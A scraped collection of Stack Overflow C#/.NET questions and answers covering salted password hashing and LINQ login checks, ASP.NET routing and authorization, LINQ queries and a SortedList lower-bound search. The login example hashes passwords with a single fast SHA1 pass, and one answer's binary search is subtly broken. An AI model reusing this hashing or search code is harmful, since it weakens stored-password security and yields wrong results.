            byte[] hashedBytes = Hasher.ComputeHash(clearBytes);
            return Convert.ToBase64String(hashedBytes);
        }

        static internal string HashEncryptStringWithSalt(string s, string salt)
        {
            return HashEncryptString(salt + s);
        }
    }
    #endregion

    private void GetSalt()
    {
        this.textBoxSalt.Text = PasswordCrypto.GetSalt(16);
    }

      private void GetSaltHash()
      {
          // It's how i salt and hash the password before to save it to the Database
          this.textBoxPassword.Text = PasswordCrypto.HashEncryptStringWithSalt(this.textBoxClear.Text, this.textBoxSalt.Text);
      }

    private void GetHash()
    {
        //Demo purposes -- this is an unsalted hash
        this.textBoxClear.Text = PasswordCrypto.HashEncryptString(this.textBoxPassword.Text);
    }

    private void Add(object sender, RoutedEventArgs e)
    {
        DataClasses1DataContext dc = new DataClasses1DataContext();

        try
        {
            if (textBoxUserName.Text.Length &gt; 0)
            {
                ProvaH tab = new ProvaH();
                tab.UserName = textBoxUserName.Text;
                tab.Password = textBoxPassword.Text;
                tab.Salt = textBoxSalt.Text;
                dc.ProvaHs.InsertOnSubmit(tab);
                dc.SubmitChanges();

            }
        }
        catch (Exception ex)
        {

            MessageBox.Show(""Error!!!"");
        }

    }

    private void HashButton(object sender, RoutedEventArgs e)
    {
        GetHash();
    }

    private void SaltButton(object sender, RoutedEventArgs e)
    {
        GetSalt();
    }

    private void HashSaltButton(object sender, RoutedEventArgs e)
    {
        GetSaltHash();
    }

    private void Close_W(object sender, RoutedEventArgs e)
    {
        this.Close();
    }

}
</code></pre>

<p>}</p>

<ul>
<li>with this method i can salt,hash and save password  to the database..(following advices StackOverflow's member ) thanks..</li>
</ul>

<p>Now i'm testing how store password from the database and here i got a trouble...</p>

<pre><code>  public partial class Login : Window
{
    public Login()
    {
        InitializeComponent();
    }
    #region SALT
    public static class PasswordCrypto
    {
        private static SHA1CryptoServiceProvider Hasher = new SHA1CryptoServiceProvider();
        //Private Hasher As New MD5CryptoServiceProvider()

        static internal string GetSalt(int saltSize)
        {
            byte[] buffer = new byte[saltSize + 1];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            rng.GetBytes(buffer);
            return Convert.ToBase64String(buffer);
        }

        static internal string HashEncryptString(string s)
        {
            byte[] clearBytes = Encoding.UTF8.GetBytes(s);
            byte[] hashedBytes = Hasher.ComputeHash(clearBytes);
            return Convert.ToBase64String(hashedBytes);
        }

        static internal string HashEncryptStringWithSalt(string s, string salt)
        {
            return HashEncryptString(salt + s);
        }
    }
    #endregion

    private void closs(object sender, RoutedEventArgs e)
    {
        this.Close();
    }


      public bool ValidateApplicationUser(string userName, string password)
      {

        bool OK = false;
          DataClasses1DataContext dc = new DataClasses1DataContext();

          object saltValue = from c in dc.ProvaHs where c.UserName == userName  select c.Salt;
          if (!(saltValue == System.DBNull.Value))
          {
              password = PasswordCrypto.HashEncryptStringWithSalt(passwordTextBox.Password, saltValue.ToString());

          }
          var query = from c in dc.ProvaHs where c.UserName == userName &amp;&amp; c.Password == password select new { c.LoginID, c.UserName, c.Password };
          if (query.Count() != 0)
          {
              return true;
          }
       return false;
      }

    private void Confirm(object sender, RoutedEventArgs e)
    {
           bool authenticated = true;

        if (usernameTextBox.Text != """" &amp;&amp; passwordTextBox.Password.ToString() != """") 
           {
               authenticated = ValidateApplicationUser(usernameTextBox.Text, passwordTextBox.Password.ToString());
           }
           if (!authenticated)
           {
               MessageBox.Show(""Invalid login. Try again."");
           }
           else
           {
               MessageBox.Show(""Aaaaahhhh.JOB DONE!!!!...."");
           }
    }
}
</code></pre>

<p>when i debug the application i receive always an error at this code line :
  if (query.Count() != 0) in ""query"" =  Empty :""Enumeration yielded no results""
Do you have any suggest how work out this error and store password from database in my case?
Thanks</p>
","33708","Mehrdad Afshari","<p>Try:</p>

<pre><code>public bool ValidateApplicationUser(string userName, string password)
{
  DataClasses1DataContext dc = new DataClasses1DataContext();

  var saltValue = dc.ProvaHs.Where(c =&gt; c.UserName == userName)
                            .Select(c =&gt; c.Salt)
                            .SingleOrDefault();

  if (saltValue == null) return false;

  password = PasswordCrypto.HashEncryptStringWithSalt(passwordTextBox.Password, saltValue.ToString());

  return dc.ProvaHs.Any(c =&gt; c.UserName == userName &amp;&amp; c.Password == password);
}
</code></pre>
"
"<p>I know PDBs are generated for <em>managed</em> projects in .NET by giving the compiler the /debug argument.
Is there a way to specify this in the VS (2005) GUI? </p>

<p>The only way I could get it to generate PDBs in release mode so far is to manually modify the .csproj file and to add :</p>

<pre><code>&lt;DebugSymbols&gt;true&lt;/DebugSymbols&gt;
&lt;DebugType&gt;full&lt;/DebugType&gt;
</code></pre>

<p>under the 'release' settings:</p>

<pre><code>&lt;PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ""&gt;
</code></pre>

<p>Another thing: I learned from MSDN <a href=""http://msdn.microsoft.com/en-us/library/bb629394.aspx"" rel=""nofollow"">here</a> that the possible values for the <code>DebugType</code> tag are:</p>

<ul>
<li><code>full</code></li>
<li><code>pdbonly</code></li>
<li><code>none</code></li>
</ul>

<p>How do these values affect the compiler's behaviour?</p>
","33708","Mehrdad Afshari","<p>In VS2008, you can set the property using the project properties <code>-&gt;</code> Build <code>-&gt;</code> Advanced... <code>-&gt;</code> Debug Info.  </p>
"
"<p>like 17, is a prime, when reversed, 71 is also a prime.</p>

<p>We manage to arrive at this code but we cant finish it.</p>

<pre><code>#include &lt;stdio.h&gt;
main()
{
    int i = 10, j, c, sum, b, x, d, e, z, f, g;

    printf(""\nPrime numbers from 10 to 99 are the follwing:\n"");

    while (i &lt;= 99)
    {
        c=0;

        for (j = 1; j &lt;= i; j++)
        {
            if (i % j == 0) c++;
        }

        if (c == 2)
        {
            b = i;
            d = b / 10;
            e = b - (10 * d);
            x = (e * 10) + d;

            {
                z = 0;
                f = x;

                for (j = 1; j &lt;= f; j++)
                {
                    if (f % j == 0) z++;
                }

                if (z == 2)
                {
                    printf(""%d %d\n"", i, f);
                }
            }
        }

        i++;
    }

    getch();
}
</code></pre>

<p>my problem is how to add all the <em>f</em>s..</p>

<p>the answer should be 429.</p>

<p>how can i add all the f?</p>
","33708","Mehrdad Afshari","<p>Why don't you break up the code into some functions:</p>

<ul>
<li><code>bool isPrime(int number)</code> that checks if a number is prime.</li>
<li><code>int reverse(int number)</code> that reverses the number.</li>
</ul>

<p>Then the algorithm would be:</p>

<pre><code>sum = 0;
for (i = 2; i &lt;= 99; ++i)
   if (isPrime(i) &amp;&amp; isPrime(reverse(i)))
      sum += i;
</code></pre>
"
"<p>I am getting a list of running processes via LINQ.</p>

<p>The two properties I want are ""ProcessName"" and ""WorkingSet64"".</p>

<p>However, in my UI, I want these properties to be called ""ProcessName"" and ""ProcessId"".</p>

<p>How can I remap the name ""WorkingSet64"" to ""ProcessId""?</p>

<p>I did a pseudo syntax of what I am looking for below:</p>

<pre><code>using System.Linq;
using System.Windows;
using System.Diagnostics;

namespace TestLinq22
{
    public partial class Window1 : Window
    {
        public Window1()
        {
            InitializeComponent();

            var theProcesses =
                from p in Process.GetProcesses()
                orderby p.WorkingSet64 descending
                select new { p.ProcessName, p.WorkingSet64 alias ""ProcessId"" };

            foreach (var item in theProcesses)
            {
                TheListBox.Items.Add(item);
            }
        }
    }
}
</code></pre>
","33708","Mehrdad Afshari","<pre><code>select new { p.ProcessName, ProcessId = p.WorkingSet64 };
</code></pre>
"
"<p>i have little  problem with if </p>

<pre><code>{
    string nom;
    string ou;
    nom = ""1"";
    if (nom == ""1"")
    {
        nom +=1;
        ou = nom;
    }
    Console.Write(ou);
}
</code></pre>

<p>but i cant print ou value  i dont know why </p>
","33708","Mehrdad Afshari","<p>C# compiler requires the variables to be definitely initialized before use.</p>

<p>Definite initialization is a compile-time thing, it doesn't consider runtime values of variables.</p>

<p>However, if the variable <code>nom</code> was explicitly definied as <code>const</code>, the compiler would be sure that it would not change at runtime and the <code>if</code> statement block would run and the variable <code>ou</code> would be definitely assigned to.</p>
"
"<p>I would like to use <code>NGEN.EXE</code> in order to generate native images of my assemblies before I create my installer. I am hoping this will keep my binaries <a href=""http://www.red-gate.com/products/reflector/"" rel=""nofollow""><code>Reflector</code></a>-proof. Am I correct about this?</p>

<p>I have just come to understand that all native images are now being stored in the Native Image Cache. Is there a way to get native binaries which I can then package with an installer? On the other hand, is it possible to get rid of the original assemblies after generating the native images?</p>

<p><strong>EDIT:</strong> I am using an application which uses a hard-coded key for encryption when talking to a server. With .NET, it becomes ridiculously easy for folks to lay their hands on the key.</p>
","33708","Mehrdad Afshari","<p>You cannot ship only the ngen image of the assembly. The runtime still requires the actual assembly to exist even when it has a native image of it. The reason is the assembly metadata is not carried over to the native image.</p>
"
"<p>I have the following code in one of my methods:</p>

<pre><code>foreach (var s in vars)
{
    foreach (var type in statusList)
    {
        if (type.Id == s)
        {
            Add(new NameValuePair(type.Id, type.Text));
            break;
        }
    }
}
</code></pre>

<p>This seems sort of ineffective to me, and I was wondering if there was a way to substitute at least one of the foreaches wih a LINQ query. Any suggestions?</p>

<p><b>EDIT:</b> vars is an array of strings and the Add method adds an item to a CSLA NameValueList.</p>
","33708","Mehrdad Afshari","<p>Something like this:</p>

<pre><code>foreach(var s in vars) {
    var type = statusList.FirstOrDefault(t =&gt; t.Id == s);
    if (type != null)
        Add(new NameValuePair(type.Id, type.Text));
}
</code></pre>

<p>Or if vars supports <code>ForEach</code> method, this would work too (however I recommend against overLINQifying):</p>

<pre><code>vars.ForEach(s =&gt; {
    var type = statusList.FirstOrDefault(t =&gt; t.Id == s);
    if (type != null)
       Add(new NameValuePair(type.Id, type.Text));
});
</code></pre>

<p>I assumed <code>type</code> is an instance of a reference type.</p>
"
"<p>I want to find the highest AutoIncremented value from a field. (its not being fetched after an insert where I can use <code>@@SCOPE_IDENTITY</code> etc)
Which of these two queries would run faster or gives better performance.
<code>Id</code> is the primary key and <code>autoincrement</code> field for <code>Table1</code>. And this is for Sql Server 2005. </p>

<pre><code>SELECT MAX(Id) FROM Table1

SELECT TOP 1 Id FROM Table1 ORDER BY Id DESC
</code></pre>

<p><strong>[Edit]</strong><br/>
Yes in this case <code>Id</code> is the field on which I have defined the clustered index.<br/>
If the index is <code>ID DESC</code> then what..<br/>
And yes it would be nice to know how the performance would be affected if <br/>
1. Id is a clustered index + primary key.<br/>
2. Id is a clustered index and not primary key.<br/>
3. Id is a non clustered index ASC + primary key.<br/>
4. Id is a non clustered index ASC  and not primary key.<br/>
5. Id is a non clustered index DESC + primary key.<br/>
6. Id is a non clustered index DESC and not primary key.<br/>
7. Id is just <code>AutoIncrement</code></p>

<p>Hope its not a tall order!</p>
","33708","Mehrdad Afshari","<p><code>MAX</code> is generally faster.</p>

<p>Both queries will use the index on the column if exists.</p>

<p>If no index exists on the column, the <code>TOP 1</code> query will use a <code>Top N Sort</code> operator to <strong>sort</strong> the table instead of <strong>stream aggregation</strong>, which makes it slower.</p>

<p><code>MAX</code> also provides better readability.</p>

<p><em>Side Note</em>: while <code>MAX</code> will use a stream aggregate operator in the execution plan in the indexed case, it doesn't have any specific cost as it's just processing a single row (<code>Actual Rows = 1</code>). You can compare queries by running them in a single batch and see the relative cost. In the indexed case, both queries will cost 50%. I tested the non-indexed case on a table with about 7000 rows and TOP will cost 65% in comparison to MAX that costs 35%.</p>
"
"<p>Having the following generic class that would contain either <strong><code>string, int, float, long</code></strong> as the type:</p>

<pre><code>public class MyData&lt;T&gt;
{
    private T _data;

    public MyData (T value)
    {
        _data = value;
    }

    public T Data { get { return _data; } }
}
</code></pre>

<p>I am trying to get a list of <strong><code>MyData&lt;T&gt;</code></strong> where each item would be of different <strong><code>T</code></strong>.</p>

<p>I want to be able to access an item from the list and get its value as in the following code:</p>

<pre><code>MyData&lt;&gt; myData = _myList[0];    // Could be &lt;string&gt;, &lt;int&gt;, ...
SomeMethod (myData.Data);
</code></pre>

<p>where <strong><code>SomeMethod()</code></strong> is declared as follows:</p>

<pre><code>public void SomeMethod (string value);
public void SomeMethod (int value);
public void SomeMethod (float value);
</code></pre>

<p><hr /></p>

<p><strong>UPDATE:</strong></p>

<p><strong><code>SomeMethod()</code></strong> is from another tier class I do not have control of and <strong><code>SomeMethod(object)</code></strong> does not exist.</p>

<p><hr /></p>

<p>However, I can't seem to find a way to make the compiler happy.</p>

<p>Any suggestions?</p>

<p>Thank you.</p>
","33708","Mehrdad Afshari","<p>Inherit <code>MyData&lt;T&gt;</code> from a non-generic <code>MyData</code> class and make a list of that.</p>

<p>This way, you can't automatically resolve the overload. You have to do it manually.</p>

<pre><code>abstract class MyData { 
   protected abstract object GetData();
   protected abstract Type GetDataType(); 
   public object Data {
      get { return GetData(); } 
   }
   public Type DataType {
      get { return GetDataType(); } 
   }
}

class MyData&lt;T&gt; : MyData { 
   protected override object GetData() { return Data; }
   protected override Type GetDataType() { return typeof(T); }
   public new T Data {
     get { ... }
   }
}
</code></pre>
"
"<p>When working on web apps in ASP.NET, what is the reason for specifying a file as stylesheet.css.aspx rather than just plain stylesheet.css? I have seen this done in various web apps.</p>

<p>The web designer mentioned something about how it's a .NET thing and storing a global variable for the ASPX page but I didn't really understand, nor know the full story.</p>

<p>This is done at my work for a large web app with different sites for different countries. This makes me wonder, when would I make separate web apps for separate countries as opposed to one web app serving different languages? Is there a performance, architectural or other technical reason for doing so? I can think of several non tech reasons (e.g. SEO considerations).</p>
","33708","Mehrdad Afshari","<p>Probably the stylesheet is not static and is dynamically generated on the server.</p>

<p>This technique can be used to provide a different style sheet by considering several parameters (such as user theme selection or something).</p>

<p><strong>Clarification</strong>: While you can map <code>.css</code> extension in IIS to be handled by ASP.NET. It has two problems:</p>

<ol>
<li>Static CSS files will also get handed down to ASP.NET runtime, which will cause a small performance loss.</li>
<li>In many shared hosting environments, you don't have any control on IIS handler mappings.</li>
</ol>

<p>Web browsers don't care (at least, they shouldn't care) about the extension or anything else about the URL. The only thing they should care about is the <code>Content-Type</code> header. It should be set to <code>text/css</code>; otherwise some of them may complain.</p>
"
"<p>Could someone take the time to explain me the language underpinnings here :</p>

<pre><code>int foo = myObject.SomeList.Count;
for (int i = 0 ; i &lt; foo ; i++)
{
  myObject.SomeList.Add(bar);
}
</code></pre>

<p>goes into an infinite loop because <code>foo</code> references a value that keeps being incremented. Modifying the first line to:</p>

<pre><code>int foo = (int)myObject.SomeList.Count;
</code></pre>

<p>makes it go away, somehow changing <code>foo</code> from reference to value once and for all. This is probably textbook but, why is this happening ?</p>

<p>Many thanks</p>

<p><strong>EDIT :</strong> Ok, as Patrick mentions, the infinite loop only happens when there is no prior storage to foo, the cast being pointless, which makes sense. That's indeed what I thought initially while debugging this. Hence my surprise when the cast fixed it. What actually happened is that I was misled by Visual Studio into thinking I had fixed it when there was actually a problem of synchronization between edited code and executed code, which led to wrong conclusions.</p>
","33708","Mehrdad Afshari","<p>Are you sure?!!</p>

<p><code>int</code> is a value type. This is not supposed to happen.</p>

<p>Jon Skeet, come and help!</p>
"
"<p>I have two classes:</p>

<pre><code>class Foo 
{ 
    public Bar SomeBar { get; set; } 
}

class Bar
{ 
    public string Name { get; set; } 
}
</code></pre>

<p>I have a list of Foos that I group together:</p>

<pre><code>var someGroup = from f in fooList
                orderby f.SomeBar.Name ascending
                group f by f.SomeBar.Name into Group
                select Group;
</code></pre>

<p>How can I get the list of the distinct Bars from someGroup?</p>
","33708","Mehrdad Afshari","<p>If you define ""being distinct"" by a special <code>Equals</code> implementation for <code>Bar</code>, you could use:</p>

<pre><code>var result = someGroup.SelectMany(x =&gt; x.Select(t =&gt; t.SomeBar)).Distinct();
</code></pre>
"
"<p>My Map is:</p>

<pre><code>routes.MapRoute(
   ""Default"",                                             // Route name
   ""{controller}/{action}/{id}"",                          // URL with params
   new { controller = ""Home"", action = ""Index"", id = """" } // Param defaults
);
</code></pre>

<p>If I use the URL <code>http://localhost:5000/Home/About/100%2f200</code> there is no matching route.
I change the URL to <code>http://localhost:5000/Home/About/100</code> then the route is matched again.</p>

<p>Is there any easy way to work with parameters that contain slashes? Other escaped values (space <code>%20</code>) seem to work.</p>

<p>EDIT:</p>

<p>To encode Base64 works for me. It makes the URL ugly, but that's OK for now.</p>

<pre><code>public class UrlEncoder
{ 
    public string URLDecode(string  decode)
    {
        if (decode == null) return null;
        if (decode.StartsWith(""=""))
        {
            return FromBase64(decode.TrimStart('='));
        }
        else
        {
            return HttpUtility.UrlDecode( decode) ;
        }
    }

    public string UrlEncode(string encode)
    {
        if (encode == null) return null;
        string encoded = HttpUtility.PathEncode(encode);
        if (encoded.Replace(""%20"", """") == encode.Replace("" "", """"))
        {
            return encoded;
        }
        else
        {
            return ""="" + ToBase64(encode);
        }
    }

    public string ToBase64(string encode)
    {
        Byte[] btByteArray = null;
        UTF8Encoding encoding = new UTF8Encoding();
        btByteArray = encoding.GetBytes(encode);
        string sResult = System.Convert.ToBase64String(btByteArray, 0, btByteArray.Length);
        sResult = sResult.Replace(""+"", ""-"").Replace(""/"", ""_"");
        return sResult;
    }

    public string FromBase64(string decode)
    {
        decode = decode.Replace(""-"", ""+"").Replace(""_"", ""/"");
        UTF8Encoding encoding = new UTF8Encoding();
        return encoding.GetString(Convert.FromBase64String(decode));
    }
}
</code></pre>

<p>EDIT1:</p>

<p>At the end it turned out that the best way was to save a nicely formated string for each item I need to select. Thats much better because now I only encode values and never decode them. All special characters become ""-"". A lot of my db-tables now have this additional column ""URL"". The data is pretty stable, thats why I can go this way. I can even check, if the data in ""URL"" is unique.</p>

<p>EDIT2:</p>

<p>Also watch out for space character. It looks ok on VS integrated webserver but is different on iis7 <a href=""http://stackoverflow.com/questions/1651711/properly-url-encode-space-character"">http://stackoverflow.com/questions/1651711/properly-url-encode-space-character</a></p>
","33708","Mehrdad Afshari","<p>If it's only your last parameter, you could do:</p>

<pre><code>routes.MapRoute(
    ""Default"",                                                // Route name
    ""{controller}/{action}/{*id}"",                            // URL with parameters
    new { controller = ""Home"", action = ""Index"", id = """" });  // Parameter defaults
</code></pre>
"
"<p>I'm about to start building a new asp.net project, and I'm just starting out with the whole thing of SQLMembershipProvider. What I really want to do is to remove the need for a username and just have the key to the user as the email address.</p>

<p>It seems to me that the easiest thing might be to change the stored procedures to just remove the email address from the tables, and when someone does a search by email, just to use the key (I also need to deal with someone changing their email address...</p>

<p>Before I start, does anyone know a pre-rolled example out there. It just seems too common to have to build it.</p>
","33708","Mehrdad Afshari","<p>You don't need to change anything in the provider. Just set the email as user name upon registration and don't provide any means in the UI to change the email address. It'll do the work easily. </p>
"
"<p>Hi I was wondering what is the best way to force the user to login when arriving at a website, in .net.  I have set up the Membership features and I was wondering what is the best way to ensure that no matter what address the user arrives at, they must first get authenticated before proceding to the page they requested.  Any resources will be great, thanks.</p>
","33708","Mehrdad Afshari","<p>Alter <code>Web.config</code> in application root to read:</p>

<pre><code>&lt;authentication mode=""forms""&gt;
   &lt;forms loginUrl=""Login.aspx"" defaultUrl=""/"" /&gt;
&lt;/authentication&gt;
&lt;authorization&gt;
   &lt;deny users=""?"" /&gt;
   &lt;allow users=""*"" /&gt;
&lt;/authorization&gt;
</code></pre>

<p><em>Side note</em>: Obviously, ASP.NET can only protect the requests that are handed down to ASP.NET engine. By default, it cannot enforce the security on static resources in IIS classic mode. In that case, to control access to static resources, they should be explicitly mapped to the ASP.NET ISAPI DLL in the IIS configuration. </p>

<p>More info about Authorization here: <a href=""http://msdn.microsoft.com/en-us/library/wce3kxhd.aspx"" rel=""nofollow"">ASP.NET Authorization</a>.</p>
"
"<p>I want to have different sorting and filtering applied on my view
I figured that i'll be passing sorting and filtering params through query string</p>

<pre><code>&lt;%= Html.ActionLink(""Name"", ""Index"", new { SortBy= ""Name""}) %&gt;
</code></pre>

<p>this simple construction allows me to sort.</p>

<p>view comes back with</p>

<pre><code>?SortBy=Name
</code></pre>

<p>in query string</p>

<p>now i want to add filtering and i want my query strig to end up with </p>

<pre><code>?SortBy=Name&amp;Filter=Something
</code></pre>

<p>how can i add another parameter to list of already existing ones in ActionLink?</p>

<p>example:</p>

<p>user requests /Index/</p>

<p>view has </p>

<pre><code> &lt;%= Html.ActionLink(""Name"", ""Index"", new { SortBy= ""Name""}) %&gt;
</code></pre>

<p>and </p>

<pre><code> &lt;%= Html.ActionLink(""Name"", ""Index"", new { FilterBy= ""Name""}) %&gt;
</code></pre>

<p>links</p>

<p>first one looks like /Index/?SortBy=Name
second is  /Index/?FilterBy=Name</p>

<p>i want when user pressed sorting link after he applied some filtering - filtering is not lost, so i need a way to combine my params.
My guess is there should be a way to not parse query string, but get collection of parameters from some mvc object.</p>
","33708","Mehrdad Afshari","<pre><code>&lt;%= Html.ActionLink(""Name"", ""Index"", new { SortBy= ""Name"", Filter=""Something""}) %&gt;
</code></pre>

<p>To preserve the querystring you can:</p>

<pre><code>&lt;%= Html.ActionLink(""Name"", ""Index"", 
     String.IsNullOrEmpty(Request.QueryString[""SortBy""]) ? 
        new { Filter = ""Something"" } : 
        new { SortBy=Request.QueryString[""SortBy""], Filter=""Something""}) %&gt;
</code></pre>

<p>Or if you have more parameters, you could build the link manually by using taking <code>Request.QueryString</code> into account. </p>
"
"<p>I have an EJB 3 Entity bean that has a String property annotated with: @Column(unique=true). This value is set from a JSF page.</p>

<p>Everything works fine as long as the user does not add whitespace add the end of the input field. In that case ""someName"" and ""someName____"" are treated not unique and are stored in the database. Is there a convenient way to remove trailing (and leading) whitespace in application land, or has this to be done in database land?</p>

<p>There is an SQL Server 2008 at the end of the line and I use Hibernate for ORM.</p>

<p><strong>Re-Publishing your code to the dev server works wonders</strong> Sorry^^</p>
","33708","Mehrdad Afshari","<p>If you don't want to modify the application to trim the string before submitting it to server. You can either:</p>

<ul>
<li>If you are using stored procedures to insert data, modify the stored procedure and make it trim the string</li>
<li>Use a trigger to trim the string</li>
</ul>
"
"<p>I've recently started a new job working with webdevelopment in .NET. Coming from a php and rails background i've been working mainly in Eclipse and NetBeans, along with some TextMate.
I find myself missing a few great keyboard shortcuts and i can't seem to find a Visual Studio equivalent.</p>

<p>NetBeans has the awesome ""Go To File"" and so does Eclipse with <a href=""http://muermann.org/gotofile/"">this</a> plugin. 
Eclipse also has the option of quick searching in the open file list with <kbd>Cmd</kbd> / <kbd>Ctrl</kbd> + <kbd>E</kbd>.</p>

<p>Is there something like this in Visual Studio? Either build in or via plugin. Or is there some other way of quickly navigating between files that's prefered?</p>
","33708","Mehrdad Afshari","<p>You can press <kbd>F12</kbd> (Go to definition) on an identifier and quickly navigate to its point of definition in Visual Studio.</p>
"
"<p>Consider this code:</p>

<pre><code>#include &lt;vector&gt;

void Example()
{
    std::vector&lt;TCHAR*&gt; list;
    TCHAR* pLine = new TCHAR[20];
    list.push_back(pLine);
    list.clear();    // is delete called here?
    // is delete pLine; necessary?
}
</code></pre>

<p>Does list.clear() call delete on each element? I.e. do I have to free the memory before / after list.clear()?</p>
","33708","Mehrdad Afshari","<p>Nope. It doesn't do that since there is no guarantee you are not using the pointer anywhere else. If it wasn't a pointer variable, it would free them (by calling the destructor)</p>
"
"<p>I just read the top answer at this post: <br>
<a href=""http://stackoverflow.com/questions/374522/problem-inserting-string-or-null-into-sql-server-database"">http://stackoverflow.com/questions/374522/problem-inserting-string-or-null-into-sql-server-database</a></p>

<p>Correct me if I'm wrong, but can the ??-operator not only be used on two variables of the same type, if not I would greatly appreciate it, if anyone could solve my minor problem.</p>

<p>I tried to insert some code in my project similar to the one below.</p>

<pre><code>Dictionary&lt;string, string&gt; strings = new Dictionary&lt;string, string&gt;()
{
    {""@param0"", strParam0},
    {""@param1"", strParam1},
    {""@param2"", strParam2}
};
foreach (string param in strings.Keys)
{
    cmd.Parameters.AddWithValue(param, strings[param] ?? DBNull.Value);
}
</code></pre>

<p>But Visual Studio complains with the following message:<br>
""Operator '??' cannot be applied to operands of type 'string' and 'System.DBNull'""  </p>
","33708","Mehrdad Afshari","<p>Try:</p>

<pre><code>cmd.Parameters.AddWithValue(param, (object)strings[param] ?? DBNull.Value);
</code></pre>
"
"<p>Here's the thing. My .NET application crashes with a pretty ugly general exception fault when I try to run it in a machine that doesn't have .NET framework installed.</p>

<p>Is this normal? If it is... is there any way to check for .NET framework to be able to exit gracefully instead?</p>
","33708","Mehrdad Afshari","<p>You can't check the version number of the .NET framework with <strong>managed</strong> code as it can't execute before loading the .NET runtime. You can use the CLR Unmanaged API to do so, but the best way is to solve this problem is to provide an installation mechanism that checks, downloads and installs .NET Framework if it's not installed on the machine.</p>
"
"<p>I can select the first customer node and change its company name with the code below.</p>

<p>But how do I select customer node where ID=2?</p>

<pre><code>    XDocument xmldoc = new XDocument(
        new XDeclaration(""1.0"", ""utf-8"", ""yes""),
        new XComment(""These are all the customers transfered from the database.""),
        new XElement(""Customers"",
            new XElement(""Customer"",
                new XAttribute(""ID"", 1),
                new XElement(""FullName"", ""Jim Tester""),
                new XElement(""Title"", ""Developer""),
                new XElement(""Company"", ""Apple Inc."")
                ),
            new XElement(""Customer"",
                new XAttribute(""ID"", 2),
                new XElement(""FullName"", ""John Testly""),
                new XElement(""Title"", ""Tester""),
                new XElement(""Company"", ""Google"")
                )
            )
        );

    XElement elementToChange = xmldoc.Element(""Customers"").Element(""Customer"").Element(""Company"");
    elementToChange.ReplaceWith(new XElement(""Company"", ""new company value...""));
</code></pre>

<h2>ANSWER:</h2>

<p>Thanks guys, for the record, here is the exact syntax to search out the company element in the customer-with-id-2 element, and then change only the value of the company element:</p>

<pre><code>XElement elementToChange = xmldoc.Element(""Customers"")
    .Elements(""Customer"")
    .Single(x =&gt; (int)x.Attribute(""ID"") == 2)
    .Element(""Company"");
elementToChange.ReplaceWith(
    new XElement(""Company"", ""new company value..."")
    );
</code></pre>

<h2>ANSWER WITH METHOD SYNTAX:</h2>

<p>Just figured it out in method syntax as well:</p>

<pre><code>XElement elementToChange = (from c in xmldoc.Element(""Customers"")
                                .Elements(""Customer"")
                            where (int)c.Attribute(""ID"") == 3
                            select c).Single().Element(""Company"");
</code></pre>
","33708","Mehrdad Afshari","<p>Assuming the ID is unique:</p>

<pre><code>var result = xmldoc.Element(""Customers"")
                   .Elements(""Customer"")
                   .Single(x =&gt; (int?)x.Attribute(""ID"") == 2);
</code></pre>

<p>You could also use <code>First</code>, <code>FirstOrDefault</code>, <code>SingleOrDefault</code> or <code>Where</code>, instead of <code>Single</code> for different circumstances.</p>
"
"<p>I'm interested in wed development and web 2.0 but I'm a real beginner, so I'm reading a lot about the technologies involved. I'm beginning to move towards ASP.NET because of the great free resources for learning.</p>

<p>However, as I begin to work in ""Visual Web Developer Express"" I notice that I need to understand ASP and C# or VB. Two technologies.</p>

<p>Is this the same for Ruby or PHP. Do you need to learn two languages/technologies to make web applications (not including XHTML/CSS/XML), or do you just learn PHP/Ruby?</p>

<p>Therefore is it quicker (not saying better!) for a beginner to start with PHP/RUBY rather than ASP.NET and C#/VB because you can spend your time learning one rather than two languages?</p>
","33708","Mehrdad Afshari","<p>ASP.NET is <strong>not</strong> a programming language. It's a server-side technology that supports programming in any .NET language. So you are not forced to learn 2 different <em>languages</em>.</p>

<p>This is just like PHP and Ruby. Both of them can be used to build non-Web based applications. When you are building Web applications with PHP, you are actually using both PHP scripting language and the functionality provided by some kind of framework that helps you specifically build Web applications. The two things are still the same. </p>

<p>The difference is that they are not given separate names.</p>
"
"<p>Is there a Lower Bound function on a <code>SortedList&lt;K ,V&gt;</code>? The function should return the first element equal to or greater than the specified key. Is there some other class that supports this?</p>

<p>Guys - please read the question once again. <strong>I do not need a function that returns the key if it is present. I'm interested in scenario when there is no exact key matching.</strong></p>

<p><strong>I'm interested in O(log n) time</strong>. It means that I do not have a problem with foreach loop, but rather would like to have an efficient way of doing this.</p>

<p>I have done some tests on this.</p>

<p>Linq statements are not optimized by neither the compiler nor runtime machine, so they walk through all collection elements and are slow O(n). Based on Mehrdad Afshari answer, here is a Binary Search that works in O(log n) on the Keys collection:</p>

<pre><code>public static int FindFirstIndexGreaterThanOrEqualTo&lt;T&gt;(
            this IList&lt;T&gt; sortedCollection, T key
        ) where T : IComparable&lt;T&gt; {
    int begin = 0;
    int end = sortedCollection.Count;
    while (end &gt; begin) {
        int index = (begin + end) / 2;
        T el = sortedCollection[index];
        if (el.CompareTo(key) &gt;= 0)
            end = index;
        else
            begin = index + 1;
    }
    return end;
}
</code></pre>
","33708","Mehrdad Afshari","<p>Binary search the <code>SortedList.Keys</code> collection.</p>

<p>Here we go. This is O(log <em>n</em>):</p>

<pre><code>private static int BinarySearch&lt;T&gt;(IList&lt;T&gt; list, T value)
{
    if (list == null)
        throw new ArgumentNullException(""list"");
    var comp = Comparer&lt;T&gt;.Default;
    int lo = 0, hi = list.Length - 1;
    while (lo &lt; hi) {
            int m = (hi + lo) / 2;  // this might overflow; be careful.
            if (comp.Compare(list[m], value) &lt; 0) lo = m + 1;
            else hi = m - 1;
    }
    if (comp.Compare(list[lo], value) &lt; 0) lo++;
    return lo;
}

public static int FindFirstIndexGreaterThanOrEqualTo&lt;T,U&gt;
                          (this SortedList&lt;T,U&gt; sortedList, T key)
{
    return BinarySearch(sortedList.Keys, key);
}
</code></pre>
"
"<p>I am a newbie in programming and I want to write a program in Visual Studio with using C# language which uses a textbox and a button only. When the user writes string ""A"" in the textbox and presses the button, the program shows integer ""5"" in a messagebox. If the user writes string ""B"" in the textbox, the program shows integer ""4"" in a messagebox, and for string ""C"", it shows ""3"", and goes like that... The tricky (for me) part of this program is I am not able to use any decision structures like if,switch,etc. It is possible in some way that I don't know. Please help me to learn how to do it. Thanks for giving your time.</p>
","33708","Mehrdad Afshari","<p>You should not use a decision structure. The idea is to find the difference of the entered character from ""A"".</p>

<p>Good luck!</p>
"
